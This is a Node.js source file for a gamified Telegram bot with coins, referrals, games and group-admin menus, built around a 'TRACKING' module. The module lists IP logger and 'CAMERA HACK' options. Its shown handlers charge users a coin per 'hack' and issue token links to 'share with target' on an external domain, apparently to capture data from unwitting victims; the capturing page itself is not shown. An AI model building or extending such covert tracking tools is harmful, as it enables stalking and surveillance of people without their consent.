// =====================================================
// 🔱 PRO SYSTEM v7.0 - ULTIMATE MEGA EDITION 🔱
// =====================================================
// 👨‍💻 Dev: @Mrddev | 📢 Channel: @devxtechzone
// 💰 Referral | Coins | Games | Group Tools | Redeem Codes
// 🎯 Tracking | Level System | Shop | Daily Rewards
// 📊 Analytics | Backup | Broadcast | And MUCH MORE!
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = 6170894121;
const BOT_VERSION = "7.0.0";

// ========== ALL DATABASES ==========

// ----- COINS & ECONOMY -----
const users = new Map();           // User data: coins, level, xp, referrals, inventory
const shopItems = new Map();       // Shop items for sale
const userInventory = new Map();   // Items users own
const transactions = [];           // Coin transaction history
const redeemCodes = new Map();     // Redeem codes
const dailyRewards = new Map();    // Daily reward tracking
const weeklyRewards = new Map();   // Weekly reward tracking

// ----- REFERRAL SYSTEM -----
const referrals = new Map();       // Referral tracking
const referralRewards = new Map(); // Referral rewards history

// ----- TRACKING SYSTEM -----
const activeTokens = new Map();    // Active tracking tokens
const trackingHistory = new Map(); // History of tracking attempts
const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

// ----- GROUP MANAGEMENT -----
const groupSettings = new Map();     // Group configurations
const userWarnings = new Map();      // User warnings per group
const groupBans = new Map();         // Banned users per group
const groupMutes = new Map();        // Muted users per group
const antilinkGroups = new Set();    // Anti-link enabled
const antispamGroups = new Set();    // Anti-spam enabled
const antispamUsers = new Map();     // Spam tracking per user
const welcomeMessages = new Map();   // Custom welcome messages
const goodbyeMessages = new Map();   // Custom goodbye messages
const filterWords = new Map();       // Word filters per group
const levelGroups = new Set();       // Level system enabled groups
const levelSettings = new Map();     // Level rewards settings
const stickyMessages = new Map();    // Sticky messages per group
const autoDeleteGroups = new Set();  // Auto-delete enabled
const autoDeleteSettings = new Map(); // Auto-delete timing
const captchaGroups = new Set();     // Captcha verification
const captchaUsers = new Map();      // Captcha waiting users
const reactionRoles = new Map();     // Reaction role messages
const ticketSystem = new Map();      // Support tickets
const warnsLog = [];                 // Warning history

// ----- GAMES SYSTEM -----
const gameSessions = new Map();      // Active game sessions
const gameLeaderboard = new Map();   // Game leaderboards
const dailyGames = new Map();        // Daily game limits
const jackpot = { total: 0, participants: [], lastWinner: null };
const lottery = { tickets: [], drawTime: null, prize: 0 };
const blackjackSessions = new Map(); // Blackjack games
const rouletteSessions = new Map();  // Roulette games
const slotSessions = new Map();      // Slot machine games

// ----- LEVEL & XP SYSTEM -----
const levelRewards = new Map();      // Rewards per level
const xpMultipliers = new Map();     // XP boost for users
const levelChannels = new Set();     // Level announcement channels

// ----- POLL & GIVEAWAY -----
const activePolls = new Map();       // Active polls
const activeGiveaways = new Map();   // Active giveaways
const pollVotes = new Map();         // Poll vote tracking
const giveawayEntries = new Map();   // Giveaway participants

// ----- NOTES & REMINDERS -----
const userNotes = new Map();         // Saved notes per user
const userReminders = new Map();     // Reminders per user
const globalNotes = new Map();       // Global notes (admin only)
const todoLists = new Map();         // Todo lists per user

// ----- AFK & STATUS -----
const afkUsers = new Map();          // AFK status per user
const userStatus = new Map();        // Custom status messages
const typingStatus = new Map();      // Typing indicators

// ----- CHAT SYSTEM -----
const activeChats = new Map();       // Chat with dev sessions
const chatHistory = [];              // Chat message history
const supportQueue = [];             // Support ticket queue

// ----- REPORTS & FEEDBACK -----
const userReports = [];              // User reports against others
const bugReports = [];               // Bug reports
const featureRequests = [];          // Feature suggestions
const feedbacks = [];                // User feedback

// ----- STATS & ANALYTICS -----
const commandLogs = [];              // All command usage
const userActivity = new Map();      // User activity tracking
const groupActivity = new Map();     // Group activity tracking
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0
};

// ----- BACKUP SYSTEM -----
const backups = [];                  // Backup history
const autoBackupEnabled = true;
const BACKUP_INTERVAL = 24 * 60 * 60 * 1000; // Daily

// ----- BLACKLIST & WHITELIST -----
const globalBlacklist = new Set();   // Globally banned users
const globalWhitelist = new Set();   // Whitelisted users
const groupBlacklist = new Map();    // Group-specific blacklists

// ----- AUTO RESPONDER -----
const autoResponses = new Map();     // Auto-reply rules
const keywordResponses = new Map();  // Keyword-based responses

// ----- ECONOMY EXTRA -----
const dailyBonus = {
  base: 5,
  streakBonus: [0, 2, 5, 10, 15, 20, 25, 30, 40, 50]
};
const workJobs = [
  { name: "💻 Developer", minPay: 10, maxPay: 50, cooldown: 3600000 },
  { name: "🎨 Designer", minPay: 8, maxPay: 40, cooldown: 3600000 },
  { name: "📝 Writer", minPay: 5, maxPay: 30, cooldown: 3600000 },
  { name: "🎮 Gamer", minPay: 3, maxPay: 20, cooldown: 1800000 },
  { name: "🛒 Shopper", minPay: 2, maxPay: 15, cooldown: 900000 }
];
const userWorkCooldown = new Map();

// ----- GAMBLING SYSTEM -----
const userGamblingStats = new Map(); // Win/loss records
const casinoJackpot = { total: 1000, lastWin: null };

// ----- MARRIAGE/FRIENDSHIP -----
const marriages = new Map();         // User marriages
const friendships = new Map();       // Friend lists
const marriageRequests = new Map();  // Pending marriage requests

// ----- CLANS/GUILDS -----
const clans = new Map();             // Clan system
const clanRequests = new Map();      // Join requests
const clanWars = new Map();          // Clan wars

// ----- STREAK SYSTEM -----
const userStreaks = new Map();       // Daily/weekly/monthly streaks
const streakRewards = {
  daily: [1, 3, 5, 7, 10, 12, 15, 18, 20, 25],
  weekly: [10, 20, 35, 50, 75, 100],
  monthly: [50, 100, 200, 350, 500]
};

// ========== INITIALIZE USER (2 FREE COINS) ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      // Basic info
      id: userId,
      joinDate: Date.now(),
      lastActive: Date.now(),
      
      // Coins & Economy
      coins: 2,                    // 2 FREE coins!
      bank: 0,                    // Bank savings
      totalEarned: 0,
      totalSpent: 0,
      
      // Referrals
      referrals: 0,
      referrer: referrerId,
      referralCode: generateReferralCode(userId),
      
      // Hacks
      usedHacks: 0,
      successfulHacks: 0,
      
      // Level & XP
      level: 1,
      xp: 0,
      xpBoost: 1.0,
      
      // Streaks
      dailyStreak: 0,
      lastDaily: null,
      weeklyStreak: 0,
      lastWeekly: null,
      monthlyStreak: 0,
      lastMonthly: null,
      
      // Stats
      totalCommands: 0,
      totalMessages: 0,
      gamesPlayed: 0,
      gamesWon: 0,
      gamblingWins: 0,
      gamblingLosses: 0,
      
      // Inventory
      inventory: [],
      equippedItems: [],
      
      // Status
      afk: null,
      customStatus: null,
      
      // Badges
      badges: ["🎁 New User"],
      
      // Social
      friends: [],
      marriedTo: null,
      clan: null,
      
      // Settings
      notifications: true,
      language: "en",
      theme: "dark"
    };
    
    users.set(userId, userData);
    botStats.totalUsers++;
    
    // Give referrer bonus
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += 2;
      referrer.referrals += 1;
      referrer.totalEarned += 2;
      referrer.badges.push("🌟 Recruiter");
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      botStats.totalCoinsGiven += 2;
      
      // Notify referrer
      bot.telegram.sendMessage(referrerId, formatMessage(`
╔══════════════════════════╗
║  🎉 NEW REFERRAL! 🎉     ║
╚══════════════════════════╝

👤 Someone joined using your link!

💰 <b>Reward:</b> <code>+2 COINS</code>

📊 <b>Your Stats:</b>
• Total Coins: ${referrer.coins}
• Referrals: ${referrer.referrals}
• Total Earned: ${referrer.totalEarned}

<b>Keep sharing your referral link!</b>
      `));
    }
  }
  return users.get(userId);
}

function generateReferralCode(userId) {
  return crypto.createHash('md5').update(userId + Date.now().toString()).digest('hex').substring(0, 8).toUpperCase();
}

function formatMessage(text) {
  return text.trim().replace(/ {12}/g, '');
}

// ========== HELPER FUNCTIONS ==========
function canHack(userId) {
  const user = users.get(userId);
  return user && user.coins >= 1;
}

function useHack(userId) {
  const user = users.get(userId);
  if (user && user.coins >= 1) {
    user.coins -= 1;
    user.usedHacks += 1;
    users.set(userId, user);
    botStats.totalHacksUsed++;
    return true;
  }
  return false;
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    
    transactions.push({
      userId, amount, reason, date: Date.now()
    });
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

function addXP(userId, amount) {
  const user = users.get(userId);
  if (user) {
    const boostedAmount = Math.floor(amount * (user.xpBoost || 1));
    user.xp += boostedAmount;
    
    // Level up logic
    const xpNeeded = user.level * 100;
    let leveledUp = false;
    
    while (user.xp >= xpNeeded) {
      user.xp -= xpNeeded;
      user.level++;
      leveledUp = true;
      
      // Level up reward
      const levelReward = user.level * 5;
      user.coins += levelReward;
      
      bot.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  🎉 LEVEL UP! 🎉         ║
╚══════════════════════════╝

Congratulations! You reached <b>Level ${user.level}</b>!

💰 Reward: <code>+${levelReward} COINS</code>
⚡ XP Boost: ${user.xpBoost}x

Keep it up!
      `));
    }
    
    users.set(userId, user);
    return leveledUp;
  }
  return false;
}

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ========== REDEEM CODE SYSTEM ==========
function generateRedeemCode(coins, maxUses = 1, expiresInHours = 24, description = "") {
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: maxUses,
    remainingUses: maxUses,
    createdBy: OWNER_ID,
    createdAt: Date.now(),
    expiresAt: Date.now() + (expiresInHours * 60 * 60 * 1000),
    description: description
  });
  return code;
}

function redeemCode(userId, code) {
  const codeData = redeemCodes.get(code.toUpperCase());
  
  if (!codeData) return { success: false, message: "❌ Invalid code!" };
  if (Date.now() > codeData.expiresAt) {
    redeemCodes.delete(code);
    return { success: false, message: "❌ Code expired!" };
  }
  if (codeData.remainingUses <= 0) return { success: false, message: "❌ Code already used up!" };
  if (codeData.usedBy.includes(userId)) return { success: false, message: "❌ You already used this code!" };
  
  addCoins(userId, codeData.coins, `Redeemed code: ${code}`);
  codeData.usedBy.push(userId);
  codeData.remainingUses--;
  redeemCodes.set(code, codeData);
  botStats.totalRedeems++;
  
  return { success: true, message: `✅ You redeemed ${codeData.coins} coins!`, coins: codeData.coins };
}

// ========== FORCE JOIN CHECK ==========
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== MAIN MENU ==========
function mainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎯 TRACKING", "tracking_menu")],
    [Markup.button.callback("👑 GROUP TOOLS", "group_menu")],
    [Markup.button.callback("🎮 GAMES", "games_menu")],
    [Markup.button.callback("💰 ECONOMY", "economy_menu")],
    [Markup.button.callback("🛠 UTILITIES", "utilities_menu")],
    [Markup.button.callback("👤 PROFILE", "profile"), Markup.button.callback("📊 STATS", "stats")],
    [Markup.button.callback("🎁 REDEEM", "redeem_menu"), Markup.button.callback("📈 LEADERBOARD", "leaderboard_menu")],
    [Markup.button.callback("💬 SUPPORT", "support"), Markup.button.callback("❓ HELP", "help")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")]
  ]);
}

// ========== TRACKING MENU ==========
function trackingMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎱 POOL TRACKING", "pool")],
    [Markup.button.callback("⚡ NORMAL TRACKING", "normal")],
    [Markup.button.callback("📍 IP LOGGER", "ip_logger")],
    [Markup.button.callback("📸 CAMERA HACK", "camera_hack")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== GROUP MENU ==========
function groupMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("👋 WELCOME", "welcome_set"), Markup.button.callback("🚫 ANTILINK", "antilink")],
    [Markup.button.callback("⚠️ WARN", "warn_user"), Markup.button.callback("🔨 KICK", "kick_user")],
    [Markup.button.callback("🚫 BAN", "ban_user"), Markup.button.callback("✅ UNBAN", "unban_user")],
    [Markup.button.callback("🔇 MUTE", "mute_user"), Markup.button.callback("🔊 UNMUTE", "unmute_user")],
    [Markup.button.callback("📝 FILTER", "filter_words"), Markup.button.callback("⭐ LEVELS", "level_system")],
    [Markup.button.callback("📊 GROUP STATS", "group_stats"), Markup.button.callback("⚙️ SETTINGS", "group_settings_menu")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== GAMES MENU ==========
function gamesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎲 DICE", "dice_game"), Markup.button.callback("🎰 SLOTS", "slots")],
    [Markup.button.callback("🃏 BLACKJACK", "blackjack"), Markup.button.callback("🎯 ROULETTE", "roulette")],
    [Markup.button.callback("❓ TRIVIA", "trivia"), Markup.button.callback("🔢 GUESS NUMBER", "guess_num")],
    [Markup.button.callback("✊ RPS", "rps_game"), Markup.button.callback("💰 JACKPOT", "jackpot_game")],
    [Markup.button.callback("🏆 LEADERBOARD", "game_leaderboard"), Markup.button.callback("📊 MY STATS", "game_stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== ECONOMY MENU ==========
function economyMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("📅 WEEKLY", "weekly")],
    [Markup.button.callback("💼 WORK", "work"), Markup.button.callback("🎲 BET", "bet")],
    [Markup.button.callback("🏪 SHOP", "shop"), Markup.button.callback("🎒 INVENTORY", "inventory")],
    [Markup.button.callback("💸 TRANSFER", "transfer"), Markup.button.callback("🏦 BANK", "bank")],
    [Markup.button.callback("📈 LEADERBOARD", "coin_leaderboard"), Markup.button.callback("🎁 REFERRAL", "referral_info")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== UTILITIES MENU ==========
function utilitiesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔐 ENCRYPT", "encrypt"), Markup.button.callback("🔓 DECRYPT", "decrypt")],
    [Markup.button.callback("📝 BASE64", "base64"), Markup.button.callback("🔢 HASH", "hash")],
    [Markup.button.callback("⏰ TIMESTAMP", "timestamp"), Markup.button.callback("🎲 RANDOM", "random")],
    [Markup.button.callback("📝 NOTE", "note"), Markup.button.callback("⏰ REMINDER", "reminder")],
    [Markup.button.callback("💤 AFK", "afk"), Markup.button.callback("📋 TODO", "todo")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== PROFILE MENU ==========
async function showProfile(ctx) {
  const user = initUser(ctx.from.id);
  
  const caption = `
╔══════════════════════════╗
║  👤 USER PROFILE        ║
╚══════════════════════════╝

<b>📝 Basic Info:</b>
• Name: ${ctx.from.first_name}
• Username: @${ctx.from.username || 'None'}
• ID: <code>${ctx.from.id}</code>

<b>💰 Economy:</b>
• Coins: ${user.coins}
• Bank: ${user.bank}
• Total Earned: ${user.totalEarned}
• Total Spent: ${user.totalSpent}

<b>📊 Stats:</b>
• Level: ${user.level} (${user.xp}/100 XP)
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games Won: ${user.gamesWon}/${user.gamesPlayed}

<b>🏆 Badges:</b>
${user.badges.map(b => `• ${b}`).join('\n')}

<b>💍 Social:</b>
• Married: ${user.marriedTo ? 'Yes ❤️' : 'No'}
• Clan: ${user.clan || 'None'}

<i>🎯 Keep playing to earn more rewards!</i>
  `;
  
  await ctx.reply(caption, { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "profile"), Markup.button.callback("📊 DETAILS", "profile_details")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") return;
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  // Check blacklist
  if (globalBlacklist.has(ctx.from.id)) {
    return ctx.reply("🚫 You are banned from using this bot!");
  }
  
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.telegram.sendMessage(ctx.from.id, formatMessage(`
╔══════════════════════════╗
║  🚫 ACCESS LOCKED       ║
╚══════════════════════════╝

🔐 You must join our channel first!

<i>Why join?</i>
• Exclusive updates
• Free coins & rewards
• Premium features

👇 <b>Click below to join</b>
    `), {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  // Handle referral
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  user.lastActive = Date.now();
  users.set(ctx.from.id, user);
  
  const referralLink = getReferralLink(ctx.from.id);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

✨ <b>Welcome ${ctx.from.first_name}!</b>

💰 <b>Your Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}
👥 <b>Referrals:</b> ${user.referrals}

🎁 <b>You got 2 FREE coins!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🔗 Your Referral Link:</b>
<code>${referralLink}</code>

<i>Share this link - earn 2 coins per referral!</i>

━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu()
  });
});

// ========== CHECK JOIN ==========
bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.answerCbQuery("❌ Join channel first!", { show_alert: true });
  }
  await ctx.answerCbQuery("✅ Access Granted! 🎉");
  await ctx.deleteMessage();
  
  const user = initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

✅ <b>Access Unlocked!</b>

💰 <b>Your Balance:</b> ${user.coins} coins

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu()
  });
});

// ========== TRACKING MODES ==========
bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>1 coin</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins

🎁 <b>Ways to earn coins:</b>
• Daily reward - /daily
• Referrals - Share your link
• Work - /work
• Redeem codes
• Play games
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "pool",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎱 POOL MODE ACTIVE    ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-1</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link with target:</b>
<code>${DOMAIN}?token=${token}</code>

⚠️ <i>Link expires in 10 minutes!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

bot.action("normal", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ <b>Insufficient Coins!</b>

You need <code>1 coin</code> to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins
    `), { parse_mode: "HTML" });
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    mode: "normal",
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ⚡ NORMAL MODE ACTIVE  ║
╚══════════════════════════╝

✅ Tracking initialized!
💰 <b>Coins deducted:</b> <code>-1</code>
⏱️ <b>Token expires in:</b> 10 minutes

<b>Share this link:</b>
<code>${DOMAIN}?token=${token}</code>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

// ========== DAILY REWARD ==========
bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const lastDaily = user.lastDaily;
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (lastDaily && (now - lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - lastDaily);
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    return ctx.reply(`⏰ Daily reward already claimed! Come back in ${hours}h ${minutes}m.`);
  }
  
  // Calculate streak
  let streak = user.dailyStreak;
  if (lastDaily && (now - lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const baseReward = dailyBonus.base;
  const streakBonus = dailyBonus.streakBonus[Math.min(streak, 10)] || 0;
  const totalReward = baseReward + streakBonus;
  
  addCoins(ctx.from.id, totalReward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 DAILY REWARD! 🎁    ║
╚══════════════════════════╝

💰 <b>You received:</b> <code>+${totalReward} COINS</code>

📊 <b>Breakdown:</b>
• Base: ${baseReward}
• Streak Bonus: +${streakBonus}

🔥 <b>Current Streak:</b> ${streak} day(s)

💎 <b>New Balance:</b> ${user.coins + totalReward} coins

<i>Come back tomorrow for more!</i>
  `), { parse_mode: "HTML" });
});

// ========== WORK COMMAND ==========
bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const remaining = 3600000 - (now - lastWork);
    const minutes = Math.ceil(remaining / 60000);
    return ctx.reply(`⏰ You're tired! Rest for ${minutes} minutes before working again.`);
  }
  
  const job = workJobs[Math.floor(Math.random() * workJobs.length)];
  const reward = Math.floor(Math.random() * (job.maxPay - job.minPay + 1) + job.minPay);
  
  addCoins(userId, reward, `Worked as ${job.name}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💼 WORK COMPLETE! 💼   ║
╚══════════════════════════╝

👔 <b>Job:</b> ${job.name}
💰 <b>Payment:</b> <code>+${reward} COINS</code>

💎 <b>New Balance:</b> ${users.get(userId).coins} coins

<i>Come back in 1 hour for another shift!</i>
  `), { parse_mode: "HTML" });
});

// ========== REDEEM MENU ==========
bot.action("redeem_menu", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 REDEEM CODE        ║
╚══════════════════════════╝

<b>Enter your redeem code:</b>

Type: <code>/redeem YOUR_CODE</code>

━━━━━━━━━━━━━━━━━━━━━━━━━

<i>Get codes from:
• Giveaways
• Events
• Support channel</i>
  `), { parse_mode: "HTML" });
});

// ========== REDEEM COMMAND ==========
bot.command("redeem", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /redeem <CODE>");
  }
  
  const code = args[1];
  const result = redeemCode(ctx.from.id, code);
  
  if (result.success) {
    const user = users.get(ctx.from.id);
    await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ✅ REDEEM SUCCESS!     ║
╚══════════════════════════╝

🎉 ${result.message}

💰 <b>New Balance:</b> ${user.coins} coins
    `), { parse_mode: "HTML" });
  } else {
    await ctx.reply(result.message);
  }
});

// ========== REFERRAL INFO ==========
bot.action("referral_info", async (ctx) => {
  const user = initUser(ctx.from.id);
  const link = getReferralLink(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  🎁 REFERRAL SYSTEM     ║
╚══════════════════════════╝

<b>Your Referral Link:</b>
<code>${link}</code>

<b>Your Stats:</b>
• Referrals: ${user.referrals}
• Coins Earned: ${user.totalEarned}

<b>Rewards:</b>
• 2 coins per referral
• Special badge at 10 referrals
• Bonus rewards at 25, 50, 100

<i>Share your link and earn coins!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("📊 LEADERBOARD", "referral_leaderboard")],
    [Markup.button.callback("◀️ BACK", "economy_menu")]
  ]) });
});

// ========== STATS ==========
bot.action("stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 BOT STATISTICS      ║
╚══════════════════════════╝

<b>🤖 Bot Stats:</b>
• Version: ${BOT_VERSION}
• Uptime: ${Math.floor((Date.now() - botStats.startTime) / 86400000)} days
• Total Users: ${botStats.totalUsers}
• Total Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins Given: ${botStats.totalCoinsGiven}
• Total Referrals: ${botStats.totalReferrals}
• Total Hacks Used: ${botStats.totalHacksUsed}
• Total Redeems: ${botStats.totalRedeems}

<b>📊 Commands:</b>
• Total Commands: ${botStats.totalCommands}
• Total Messages: ${botStats.totalMessages}

<b>👤 Your Stats:</b>
• Level: ${user.level}
• Referrals: ${user.referrals}
• Hacks Used: ${user.usedHacks}
• Games Won: ${user.gamesWon}/${user.gamesPlayed}
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("🔄 REFRESH", "stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== SUPPORT ==========
bot.action("support", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💬 SUPPORT CENTER      ║
╚══════════════════════════╝

<b>Need help?</b>

📢 <b>Channel:</b> @devxtechzone
👨‍💻 <b>Developer:</b> @Mrddev

<b>Commands:</b>
/start - Restart bot
/chat - Chat with dev
/redeem CODE - Redeem code
/report - Report issue
/feedback - Send feedback

<i>Response time: Usually within 24 hours</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.url("📢 JOIN CHANNEL", "https://t.me/devxtechzone")],
    [Markup.button.url("💬 CONTACT DEV", "https://t.me/Mrddev")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== HELP ==========
bot.action("help", async (ctx) => {
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  ❓ HELP & COMMANDS     ║
╚══════════════════════════╝

<b>📋 Basic Commands:</b>
/start - Launch bot
/profile - View profile
/stats - Bot statistics
/balance - Check coins
/daily - Daily reward
/work - Work for coins
/redeem CODE - Redeem code

<b>🎮 Games:</b>
/dice - Roll dice
/slots - Slot machine
/blackjack - Card game
/trivia - Quiz game

<b>👑 Group Admin:</b>
/warn @user - Warn user
/kick @user - Kick user
/ban @user - Ban user
/purge 10 - Delete messages

<b>🛠 Utilities:</b>
/encrypt text - Encrypt message
/base64 text - Base64 encode
/timestamp - Current timestamp

<i>Use buttons below for quick access!</i>
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]) });
});

// ========== BACK BUTTONS ==========
bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  🔱 PRO SYSTEM v7.0     ║
║  ⚡ ULTIMATE EDITION    ║
╚══════════════════════════╝

💰 <b>Balance:</b> ${user.coins} coins
📊 <b>Level:</b> ${user.level}

🎯 <b>Select a module below</b>
  `), { parse_mode: "HTML", ...mainMenu() });
});

bot.action("tracking_menu", async (ctx) => {
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  🎯 TRACKING MODULE     ║
╚══════════════════════════╝

<b>Cost:</b> 1 coin per hack
<b>Expiry:</b> 10 minutes

⬇️ <b>Select tracking mode:</b>
  `), { parse_mode: "HTML", ...trackingMenu() });
});

bot.action("group_menu", async (ctx) => {
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  👑 GROUP MANAGEMENT    ║
╚══════════════════════════╝

<b>Powerful admin tools!</b>

⬇️ <b>Select action:</b>
  `), { parse_mode: "HTML", ...groupMenu() });
});

bot.action("games_menu", async (ctx) => {
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  🎮 GAMES ZONE          ║
╚══════════════════════════╝

<b>Play & Earn Coins!</b>

⬇️ <b>Choose game:</b>
  `), { parse_mode: "HTML", ...gamesMenu() });
});

